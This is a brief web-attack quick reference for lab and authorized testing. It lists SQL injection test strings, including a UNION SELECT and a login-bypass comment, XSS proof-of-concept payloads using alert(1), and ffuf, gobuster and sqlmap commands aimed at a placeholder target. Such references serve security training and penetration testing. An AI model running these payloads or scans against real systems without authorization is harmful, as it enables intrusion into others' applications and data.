# Web Attack Quick Reference (LAB USE ONLY)

## SQLi test payloads
```
' OR '1'='1
' UNION SELECT NULL,NULL-- -
admin'--
```

## XSS
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

## Common tools
```
ffuf -w wordlist -u http://target/FUZZ
gobuster dir -u http://target -w wordlist
sqlmap -u "http://target/page?id=1" --batch
```
Use only against your own lab apps (DVWA, Juice Shop) or authorized scope.
